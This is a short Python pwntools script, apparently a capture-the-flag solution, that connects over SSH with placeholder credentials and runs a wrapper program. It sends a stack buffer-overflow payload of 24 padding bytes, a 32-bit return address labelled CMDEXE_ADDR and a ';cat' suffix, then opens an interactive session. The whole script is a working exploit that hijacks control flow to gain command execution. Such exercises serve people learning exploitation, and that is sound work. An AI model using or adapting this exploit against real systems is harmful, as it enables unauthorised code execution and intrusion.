#!/usr/bin/env python3
import pwn

file = './wrapper_pe1exe.sh' 
s = pwn.ssh('login',
            'host',
            password='password',
            port=12345)

CMDEXE_ADDR = 0x00401000
p = s.run(file)

payload  = b'a'*24
payload += pwn.p32(CMDEXE_ADDR)
payload += b';cat'

p.sendline(payload)
p.interactive()

